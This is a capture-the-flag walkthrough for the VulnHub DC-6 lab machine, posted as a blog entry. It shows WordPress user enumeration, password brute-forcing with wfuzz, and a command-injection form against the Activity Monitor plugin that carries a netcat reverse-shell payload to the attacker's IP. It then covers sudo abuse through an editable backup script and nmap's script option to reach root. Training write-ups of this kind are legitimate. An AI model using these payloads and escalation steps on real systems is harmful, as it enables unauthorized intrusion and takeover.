---
layout: "post"
title: "DC 6 Walkthrough"
categories: [vulnhub, DC-Series]
tags: [medium, nmap, wordpress, bruteforce, sudo]
---

DC-6 was a medium box. First, we add the domain name in the host file to access the website. Using wpscan we find out WordPress users. We Bruteforce and log in to WordPress. With a vulnerable plugin, we get the shell on the box. After pivoting to another user with the credentials found in the things-to-do.txt, we can run `nmap` as root with Sudo and spawn a shell as root.

# Summary

- Portscan
- Add domain to host file
- Finding users in wordpress
- Generating Password file
- Bruteforce 
- Login to wordpress 
- Exploiting vulnerable plugin.
- Finding Credentials
- SSH to box
- SUDO rights
- Exploiting Nmap 
- Root access
- The Flag

# Portscan

```
Nmap scan report for 192.168.1.7
Host is up (0.00020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Website
When we browse the website with its IP address, it redirects us to `wordy` so I will add this domain name to my local host file i.e `/etc/passwd` and use the hostname instead.

```
$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	parrot

#vulnhub
192.168.1.7     wordy

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

We discovered the webpage got a WordPress CMS installed on it.
![mainpage](/assets/img/dc-6/mainpage.png)

## Finding users

I run `wpscan` to enumerate WordPress site. As a result, I found 4 users.
```
$wpscan --url http://wordy -eu

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://wordy/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jens
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] graham
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] mark
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] sarah
 | FoundBy: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
## Genrating Password list.
The author of the box DCAU gave the clue on [website](https://www.vulnhub.com/entry/dc-6,315/).
![clue](/assets/img/dc-6/clue.png)
 Let's use it to generate password file.
```
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt 
```
## Bruteforce
Now we have usernames and passwords, use this to bruteforce WordPress.
```
$wfuzz -c --hc=200 -z file,users.txt -z file,password.txt -d 'log=FUZZ&pwd=FUZ2Z&wp-submit=Log+In' http://wordy/wp-login.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://wordy/wp-login.php
Total requests: 13340

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                               
===================================================================

000009879:   302        0 L      0 W      0 Ch        "mark - helpdesk01"                                                   

```
Great, we got the password of the user `mark`.
```
username : mark
passworc : helpdesk01
```
Use this password to access wordpress.
![wordpress](/assets/img/dc-6/wordpress.png)

## Exploting wordpress plugin
We can see a plugin `Activity monitor`. 
![active monitor](/assets/img/dc-6/activitymonitor.png)
There is an exploit available for this plugin you can check [here](https://www.exploit-db.com/exploits/45274). This plugin is vulnerable to OS command injection. 

We have to modify our POST request in order to make it work.
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc 192.168.1.2 4444 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
Save the above file with .html extension and through the browser navigate into the html file by setting python http server.

![htmlfile](/assets/img/dc-6/submit.png)

Setup listener and by clicking button we get shell.
```
┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.7] 54436
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@dc-6:/var/www/html/wp-admin$ ^Z
[1]+  Stopped                 nc -nvlp 4444
┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]
└──╼ $stty raw -echo 
┌─[hitesh@parrot]─[~/boxes/vulnhub/dc-6]
└──╼ $nc -nvlp 4444

www-data@dc-6:/var/www/html/wp-admin$ export TERM=xterm
www-data@dc-6:/var/www/html/wp-admin$ 
```
# Escalating to user graham
In home directory of user mark I find out `things-to-do.txt`. This file contains password of user `graham`.
```
www-data@dc-6:/home/mark/stuff$ cat things-to-do.txt 
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
``` 

```
username : graham
password : GSo7isUM1D4
```
# Privilege Escalation
Port 22 is open for ssh and here I try to connect with ssh using creds. Then checked the sudoers list and found that graham can run `/home/jens/backups.sh` as jens without a password.
```
graham@dc-6:~$ sudo -l
Matching Defaults entries for graham on dc-6:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User graham may run the following commands on dc-6:
    (jens) NOPASSWD: /home/jens/backups.sh
```
I checked `backups.sh` and we can edit this file. Edit this file and get shell as jens.
```
graham@dc-6:~$ cat /home/jens/backups.sh 
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
graham@dc-6:~$ vi /home/jens/backups.sh 
graham@dc-6:~$ cat /home/jens/backups.sh 
#!/bin/bash
tar -czf backups.tar.gz /var/www/html
/bin/bash
graham@dc-6:~$ sudo -u jens /home/jens/backups.sh 
jens@dc-6:/home/graham$
```
Now we successfully login as jeans.
Again I checked the sudoers list and found that jens can run `/usr/bin/nmap` as root without a password.
Looking at [GTFObins](https://gtfobins.github.io/gtfobins/nmap/), I see as easy way to get a shell as root.
![gtfobins](/assets/img/dc-6/gtfobins.png)
```
jens@dc-6:~$ TF=$(mktemp)
jens@dc-6:~$ echo 'os.execute("/bin/sh")' > $TF
jens@dc-6:~$ sudo /usr/bin/nmap --script=$TF

Starting Nmap 7.40 ( https://nmap.org ) at 2020-09-01 21:26 AEST
NSE: Warning: Loading '/tmp/tmp.SOPgLECyvv' -- the recommended file extension is '.nse'.
#bash
root@dc-6:~# 
```

# The flag

```
root@dc-6:~# 

Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```
